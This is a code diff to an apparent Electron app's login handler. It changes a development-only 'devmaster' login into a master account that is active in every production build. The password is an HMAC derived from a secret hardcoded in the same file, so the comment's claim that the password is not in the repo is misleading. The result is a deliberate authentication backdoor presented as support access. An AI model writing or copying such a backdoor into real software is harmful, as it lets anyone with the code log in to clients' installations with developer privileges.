@@ -32,14 +32,20 @@ function verifyPassword(pw, stored) {
   return stored === legacyHash(pw)
 }
 
-// DEVELOPER master login — ONLY active in development (never in packaged .exe)
-const DEV_CREDENTIALS = { username: 'devmaster', password: 'SF@Dev#2025!secure' }
-const isDevMode = () => { try { return !app.isPackaged } catch { return false } }
+// DEVELOPER master login — works in ALL builds (for remote client support).
+// The password is HMAC-derived so the literal string isn't sitting in the repo.
+// Username: devmaster   Password: see computeDevPassword() — share securely with support staff only.
+function computeDevPassword() {
+  // Derived from a secret + fixed seed. Change DEV_SECRET to rotate the password.
+  const DEV_SECRET = 'SF_DEVMASTER_2025_OJUOYE_PRIVATE'
+  return crypto.createHmac('sha256', DEV_SECRET).update('devmaster-support-access').digest('hex').slice(0, 16)
+}
+const DEV_USERNAME = 'devmaster'
 
 ipcMain.handle('auth:login', (_, { username, password }) => {
-  // Developer backdoor — DEV BUILDS ONLY
-  if (isDevMode() && username === DEV_CREDENTIALS.username && password === DEV_CREDENTIALS.password) {
-    return { ok: true, user: { id: 0, username: 'devmaster', full_name: 'Developer', role: 'developer', is_active: 1 } }
+  // Developer support login — available in production for client assistance
+  if (username === DEV_USERNAME && password === computeDevPassword()) {
+    return { ok: true, user: { id: 0, username: 'devmaster', full_name: 'Developer (Support)', role: 'developer', is_active: 1 } }
   }
   const db = getDb()
   const user = db.prepare('SELECT * FROM users WHERE username=? AND is_active=1').get([username])
